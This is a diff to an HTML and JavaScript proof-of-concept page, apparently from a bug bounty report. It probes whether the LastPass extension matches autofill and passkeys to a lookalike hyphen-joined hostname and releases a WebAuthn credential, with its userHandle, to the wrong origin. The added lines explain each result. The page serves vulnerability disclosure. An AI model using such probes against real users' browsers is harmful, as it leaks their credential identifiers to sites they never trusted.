@@ -4,14 +4,17 @@
 <h3>Case 1: field probe, no interaction</h3>
 <form><input autocomplete="username" name="q1" id="x1"></form>
 <pre id="probe">icon_root_count: 0</pre>
+<pre id="probe_i" style="background:#eef;padding:6px"></pre>
 
 <h3>Case 2 and control</h3>
 <button onclick="go(true)">Case 2: get with allowCredentials, rpId omitted</button>
 <button onclick="go(false)">Control A: same call, no allowCredentials</button>
 <pre id="out"></pre>
+<pre id="out_i" style="background:#eef;padding:6px"></pre>
 
 <script>
 const CRED_ID = "3Q2x_QBELZ6QEWSY4tylgPjyRNb4ojIdqR2bIsaA-mTXHRtfnQV60H4PCvL_7IlP";
+const RP_HOST = "testorg-1-bugbounty.github.io";
 document.getElementById('org').textContent = location.origin;
 
 function b64uToBuf(s){
@@ -24,15 +27,40 @@ function b64uToBuf(s){
 }
 function hex(buf){return [...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,'0')).join('');}
 
+const suffix = location.hostname.endsWith(RP_HOST);
+const dotted = location.hostname.endsWith("." + RP_HOST);
+
+let seen = 0;
 new MutationObserver(() => {
   const n = document.querySelectorAll('[data-lastpass-icon-root]').length;
+  if (n === seen) return;
+  seen = n;
   document.getElementById('probe').textContent =
     'icon_root_count: ' + n + ' at t+' + Math.round(performance.now()) + 'ms';
+  document.getElementById('probe_i').textContent = n >= 1
+    ? 'READS AS: LastPass attached its autofill icon to a field on ' + location.hostname + '.\n'
+      + 'It only does that when it thinks a stored entry matches this page.\n'
+      + 'hostname ends with "' + RP_HOST + '": ' + suffix + '\n'
+      + 'joined by a dot (a real subdomain):  ' + dotted + '\n'
+      + (suffix && !dotted
+          ? 'So it matched on a hyphen join, which is a different site, not a subdomain.'
+          : 'No suffix relationship here, so this match came from something else. Investigate.')
+      + '\nNothing was clicked. The page counted this itself.'
+    : '';
 }).observe(document.documentElement, {childList:true, subtree:true});
+
+setTimeout(() => {
+  if (seen === 0) document.getElementById('probe_i').textContent =
+    'READS AS: no icon after 5s. LastPass matched nothing to this hostname.\n'
+    + 'hostname ends with "' + RP_HOST + '": ' + suffix + '\n'
+    + (suffix ? 'It had the suffix relationship and still did not match.'
+              : 'Expected on this host: the name has no suffix relationship to the relying party.');
+}, 5000);
 
 async function go(withAllow){
   const out = document.getElementById('out');
-  out.textContent = 'requesting ...';
+  const oi  = document.getElementById('out_i');
+  out.textContent = 'requesting ...'; oi.textContent = '';
   const t0 = performance.now();
   const pk = {
     challenge: crypto.getRandomValues(new Uint8Array(32)),
@@ -42,16 +70,26 @@ async function go(withAllow){
   try{
     const c = await navigator.credentials.get({publicKey: pk});
     const dt = Math.round(performance.now() - t0);
+    const uh = new TextDecoder().decode(c.response.userHandle);
     out.textContent =
       'elapsed_ms: ' + dt +
       '\nallowCredentials_sent: ' + withAllow +
       '\npage_origin: ' + location.origin +
       '\nrequested_rpId: (omitted)' +
       '\ncredentialId: ' + c.id +
-      '\nuserHandle: ' + new TextDecoder().decode(c.response.userHandle) +
+      '\nuserHandle: ' + uh +
       '\nsignature_bytes: ' + new Uint8Array(c.response.signature).length +
       '\nrpIdHash_hex: ' + hex(c.response.authenticatorData.slice(0,32)) +
       '\nclientDataJSON: ' + new TextDecoder().decode(c.response.clientDataJSON);
+    oi.textContent =
+      'READS AS: a credential was RELEASED to ' + location.origin + '.\n'
+      + 'userHandle "' + uh + '" is the identifier held by the site that owns this passkey.\n'
+      + (uh === 'demo-user'
+          ? 'That is the ' + RP_HOST + ' passkey. This page is not that site. That is the finding.'
+          : uh.indexOf('webauthnio') === 0
+            ? 'WARNING: this is the webauthn.io passkey, so it came through the .well-known route, not the name match. It does NOT prove this finding.'
+            : 'Unexpected userHandle. Check which site this credential belongs to before drawing any conclusion.')
+      + '\nrpIdHash is SHA-256 of the requested rpId, not of the real site, so the real site rejects this signature. Not account takeover.';
   }catch(e){
     const dt = Math.round(performance.now() - t0);
     out.textContent =
@@ -60,6 +98,14 @@ async function go(withAllow){
       '\npage_origin: ' + location.origin +
       '\nrejected_name: ' + e.name +
       '\nrejected_message: ' + e.message;
+    oi.textContent =
+      'READS AS: nothing was released. Returned in ' + dt + 'ms.\n'
+      + (withAllow
+          ? 'With allowCredentials sent. So naming the credential id did NOT get it out, and the report\'s "no credential exfiltration" line stands.'
+          : 'Without allowCredentials. This is the control and a rejection here is expected.')
+      + '\nRejection came from: ' + (e.name === 'SecurityError' && /registrable domain suffix/.test(e.message||'')
+          ? 'Chrome itself, not LastPass. The extension declined and the call fell through to the browser.'
+          : 'unclear from the error alone. Record the exact name and message.');
   }
 }
 </script>
